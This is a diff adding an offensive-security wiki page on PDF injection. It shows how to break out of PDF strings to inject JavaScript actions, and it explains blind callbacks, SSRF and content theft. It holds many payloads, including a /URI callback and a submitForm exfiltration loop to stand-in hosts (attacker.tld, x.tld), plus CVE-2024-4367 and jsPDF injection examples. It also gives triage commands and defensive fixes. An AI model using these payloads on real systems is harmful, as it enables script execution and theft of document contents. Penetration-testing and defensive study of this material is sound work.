@@ -1,0 +1,196 @@
+# PDF Injection
+
+{{#include ../../banners/hacktricks-training.md}}
+
+**If your input is being reflected inside a PDF file, you can try to inject PDF data to execute JavaScript, perform SSRF or steal the PDF content.**  
+PDF syntax is extremely permissive: if you can break out of the string or dictionary that is embedding your input, you can often append new keys, actions, or even whole objects that Acrobat and browser viewers will still parse.
+
+If you are targeting **HTML-to-PDF generators** or server-side PDF creation bugs, check the more specific pages about [HTML-to-PDF file reads](../file-inclusion/README.md#html-to-pdf-svgimg-path-traversal) and [ReportLab/xhtml2pdf RCE](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/reportlab-xhtml2pdf-triple-brackets-expression-evaluation-rce-cve-2023-33733.md). This page is focused on **PDF object / action injection in the generated document itself**.
+
+## TL;DR – Modern Attack Workflow (2024-2026)
+1. Find any user-controlled value that lands inside a **PDF string** like `( ... )`, a `/URI ( ... )`, a `/JS ( ... )`, or a field / annotation dictionary.
+2. Inject `)` (or another structure-breaking sequence) to close the original value, append your own **action dictionary** or **new object**, and reopen the original syntax if needed.
+3. Deliver the malicious PDF to a victim, an internal reviewer, or a backend workflow that opens / previews PDFs.
+4. Pivot depending on the viewer:
+   - **Acrobat / Reader** → richest JavaScript API surface (`submitForm`, `getPageNthWord`, form actions, etc.)
+   - **Chrome / Edge PDFium** → more limited, but still interesting for annotation / widget tricks and blind callbacks
+   - **Firefox / PDF.js** → classic `/JS (app.alert(1))` support is not equivalent to arbitrary JS; for real code exec think about **viewer bugs** such as **CVE-2024-4367**
+
+Example (annotation link hijack):
+```pdf
+(https://victim.internal/) ) /A << /S /JavaScript /JS (app.alert("PDF pwned")) >> /Next (
+```
+The first `)` closes the original URI string, then a new **Action** dictionary is injected.
+
+## Know Your Viewer First
+A useful nuance when testing browser-based viewers:
+
+- Seeing `app.alert(1)` only proves that the viewer executes some **embedded PDF JavaScript / actions**.
+- It **doesn't automatically mean arbitrary DOM JavaScript execution** in the surrounding web origin.
+- In **PDF.js**, the dangerous 2024 bug was not regular `/JS`, but **FontMatrix-controlled code generation** inside the glyph renderer.
+- In **commercial browser SDKs**, the interesting bugs are often in their **Acrobat-JS emulation layer**, `eval`-based sandboxes, or unsafe bridging into the hosting page / Electron container.
+
+So during triage, distinguish between:
+
+1. **PDF feature support** (`app.alert`, `submitForm`, `/OpenAction`, `/AA`)
+2. **PDF object injection** (breaking out of a reflected string / dictionary)
+3. **Viewer vulnerability** (e.g. PDF.js `FontMatrix` injection)
+4. **Origin escalation** (turning PDF JS into a real XSS / Electron RCE primitive)
+
+## Useful Injection Primitives
+| Goal | Payload Snippet | Notes |
+|------|-----------------|-------|
+| **JavaScript on open** | `/OpenAction << /S /JavaScript /JS (app.alert(1)) >>` | Good for Acrobat / Reader testing. |
+| **JavaScript on click** | `/A << /S /JavaScript /JS (app.alert(1)) >>` | Useful when you control an annotation or link action. |
+| **Additional actions** | `/AA << /O << /S /JavaScript /JS (app.alert(1)) >> >>` | `/O` = open/focus-style action, `/E` = mouse-enter, etc. |
+| **Blind callback** | `/A << /S /URI /URI (https://attacker.tld/) >>` | Basic out-of-band reachability check. |
+| **Blind SSRF / POST** | Inject a widget/text field and call `this.submitForm(...)` | Stronger than a simple `/URI` because you can send field values. |
+| **Content theft** | `for (...) this.getPageNthWord(...)` | Especially useful in Acrobat and in PortSwigger's PDFium research chain. |
+| **New object injection** | `\nendobj\n10 0 obj\n<< ... >>\nendobj` | Works if the generator lets you inject raw line breaks. |
+
+## Embedded Actions as Injection Targets
+PDF viewers treat **embedded actions** such as `/OpenAction` and `/AA` (Additional Actions) as first-class features. If you can inject into a dictionary that accepts actions (Catalog, Page, Annotation, Widget, or Form field), you can often graft an action tree and trigger code on open, click, hover, or focus.
+
+Example payload for **dictionary break-out**:
+```pdf
+) >> /AA << /O << /S /JavaScript /JS (app.alert('AA fired')) >> >> (
+```
+
+This is especially relevant when a PDF library stores attacker-controlled data in `/URI`, `/JS`, annotation author fields, form values, or helper methods such as `addJS(...)`.
+
+## High-Value Injection Targets
+When you reverse the generated PDF, prioritise these locations:
+
+- **Link annotations**: `/Subtype /Link`, `/A`, `/URI`
+- **Widget annotations / AcroForm**: `/Subtype /Widget`, `/AA`, `/FT /Btn`, `/FT /Tx`
+- **Catalog-level actions**: `/OpenAction`, `/Names`, `/JavaScript`
+- **Text / metadata fields** that later become annotation names or popup contents
+- **Library helper APIs** that emit raw PDF strings, for example `createAnnotation(...)`, `addJS(...)`, or direct dictionary setters
+
+A lot of modern wins still start from the same primitive: **one unescaped `(`, `)`, or `\` inside a PDF string**.
+
+## Recon & Triage Workflow
+If you can download the generated PDF, don't guess: inspect it.
+
+```bash
+# Make the structure easier to read
+qpdf --qdf --object-streams=disable victim.pdf readable.pdf
+
+# Quick keyword hunt
+pdfid.py readable.pdf
+pdf-parser.py -search "/JS" -search "/AA" -search "/OpenAction" readable.pdf
+
+# Fast grep when you only need the reflected sink
+rg -n '/URI|/JS|/AA|/OpenAction|/Subtype /Link|/Subtype /Widget' readable.pdf
+```
+
+For a broader PDF reversing workflow, check:
+
+{{#ref}}
+../../generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/pdf-file-analysis.md
+{{#endref}}
+
+## Practical Exploitation Patterns
+### 1. Link / URI break-out
+Classic case: your input lands in `/URI (...)`.
+
+```pdf
+) /A << /S /JavaScript /JS (app.alert(1)) >> (
+```
+
+If the application only validates the visible URL but not the raw PDF string escaping, you can replace a harmless link with a JavaScript action or a new `/URI` pointing to your server.
+
+### 2. Widget / AcroForm upgrade
+PortSwigger's research showed that turning an annotation into a **Widget** with a fake parent field is often the key to making JavaScript execute in browser viewers that otherwise seem too restricted.<sup>[[1]](#references)</sup>
+
+```pdf
+#)>> << /Type /Annot /Rect [0 0 900 900] /Subtype /Widget
+/Parent << /FT /Btn /T(a) >>
+/A << /S /JavaScript /JS (app.alert(1)) >>
+```
+
+This pattern is much more useful than a naive `/JS (app.alert(1))` pasted into random places.
+
+### 3. Mouse-enter / hover execution
+If click interaction is a problem, try an **Additional Action** on mouse enter:
+
+```pdf
+/AA << /E << /S /JavaScript /JS (app.alert(1)) >> >>
+```
+
+This is mainly useful for proving code execution or building staged chains. In PDFium, hover-triggered JS is easier than full exfil because outbound submission still depends on what APIs the viewer exposes.
+
+### 4. Blind document exfiltration
+If you already have JavaScript execution inside the PDF runtime, enumerate words and leak them out:
+
+```javascript
+words = [];
+for (page = 0; page < this.numPages; page++) {
+  for (wordPos = 0; wordPos < this.getPageNumWords(page); wordPos++) {
+    words.push(this.getPageNthWord(page, wordPos, true));
+  }
+}
+```
+
+On Acrobat this becomes powerful when combined with `submitForm(...)`. On Chrome/PDFium, PortSwigger showed that `getPageNthWord(...)` can still be abused after the right annotation/widget trick.<sup>[[1]](#references)</sup>
+
+## Blind Enumeration Trick
+When you don't know which objects / methods are available in the current viewer, enumerate the document object and look for useful sinks:
+
+```pdf
+) /JS (for(i in this){try{this.submitForm('https://x.tld?'+i+'='+this[i])}catch(e){}}) /S /JavaScript /A << >> (
+```
+
+This is noisy, but great in blind scenarios where you only get out-of-band callbacks.
+
+## Real-World Bugs Worth Remembering
+### CVE-2024-4367 – PDF.js `FontMatrix` injection
+This one is important because it is **not** classic PDF `/JS` support. Vulnerable PDF.js versions generated JavaScript code with `new Function(...)` while assuming `FontMatrix` only contained numbers. A crafted **Type1** font object could inject a string into `c.transform(...)` and achieve arbitrary JavaScript execution in the PDF.js context.<sup>[[2]](#references)</sup>
+
+Minimal idea:
+```pdf
+/FontMatrix [1 2 3 4 5 (0\); alert\('pwned')]
+```
+
+Notes:
+- Relevant for **Firefox < 126**, **Firefox ESR < 115.11**, and **pdfjs-dist <= 4.1.392**.
+- If PDF.js is embedded in a web app, this becomes a **stored XSS on that origin**.
+- Setting `isEvalSupported = false` blocks the vulnerable path on unpatched deployments.
+
+### CVE-2026-25755 – jsPDF `addJS()` PDF object injection
+A newer example showing that helper APIs are still dangerous: vulnerable `jsPDF.addJS()` versions wrapped attacker-controlled JavaScript directly inside `/JS ( ... )` without escaping parentheses correctly.<sup>[[3]](#references)</sup>
+
+```javascript
+const doc = new jsPDF();
+doc.addJS("console.log('x');) >> /AA << /O << /S /JavaScript /JS (app.alert('Hacked')) >> >>");
+```
+
+This is a great reminder to review **library convenience methods**, not just annotations and links.
+
+## Testing Corpus / Tooling
+If you want ready-made payloads instead of hand-editing PDFs every time, keep a small corpus around:
+
+- **PortSwigger's `portable-data-exfiltration` samples**: excellent for Acrobat / PDFium annotation, widget, exfiltration, and SSRF chains.<sup>[[1]](#references)</sup>
+- **`PayloadsAllThePDFs`**: practical payload zoo for testing browser viewers, commercial SDKs, and PDF.js-specific cases like `FontMatrix`.
+- **`malicious-pdf`**: generates multiple PDF test cases for callbacks, content theft, hover actions, and viewer-specific behaviors.
+
+This is especially handy when you are dealing with a black-box upload / preview workflow and need to quickly answer:
+- Does the platform execute embedded JS at all?
+- Is it just `app.alert(1)` support, or real origin-level JS?
+- Are `/URI`, `/AA`, widget upgrades, or `FontMatrix` payloads reachable?
+
+## Brief Defensive Notes
+From the attacker side, the fixes to look for are predictable:
+
+1. Escaping `\`, `(` and `)` before placing user input inside PDF strings.
+2. Using **hex strings** (`<...>`) instead of raw `( ... )` strings for untrusted data.
+3. Stripping `/OpenAction`, `/AA`, `/Launch`, `/SubmitForm`, and document-level `/JavaScript` names when sanitizing PDFs.
+4. Updating vulnerable viewers/libraries such as **PDF.js** and **jsPDF**.
+
+## References
+
+- [1] [Gareth Heyes, "Portable Data exFiltration: XSS for PDFs"](https://portswigger.net/research/portable-data-exfiltration)
+- [2] [Thomas Rinsma, "CVE-2024-4367 – Arbitrary JavaScript execution in PDF.js"](https://codeanlabs.com/blog/research/cve-2024-4367-arbitrary-js-execution-in-pdf-js/)
+- [3] [NVD, "CVE-2026-25755 Detail"](https://nvd.nist.gov/vuln/detail/CVE-2026-25755)
+
+{{#include ../../banners/hacktricks-training.md}}
